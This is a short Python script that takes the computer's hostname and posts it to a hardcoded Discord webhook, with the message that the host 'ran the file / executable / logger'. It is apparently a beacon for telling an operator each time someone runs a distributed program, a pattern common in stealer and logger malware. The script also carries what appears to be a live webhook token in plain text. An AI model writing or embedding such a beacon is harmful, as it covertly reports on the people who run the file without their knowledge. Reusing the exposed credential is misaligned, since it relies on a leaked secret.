import requests
import socket
hostname = socket.gethostname()

def send_message_to_webhook(webhook_url, message):
    data = {
        'content': message
    }
    headers = {
        'Content-Type': 'application/json'
    }
    response = requests.post(webhook_url, json=data, headers=headers)

    if response.status_code == 200:
        print(f'ok')

if __name__ == "__main__":
    webhook_url = 'https://discord.com/api/webhooks/12061355289803147552/UJKnPkCb6ZDYVL1iRFgAEN8bVVpJHI16QLJUDUCHuuebk4E5F0kJoy_TK65pMAD_7SMj1'
    message_to_send = f'{hostname} ran the file / executable / logger.'

    send_message_to_webhook(webhook_url, message_to_send)
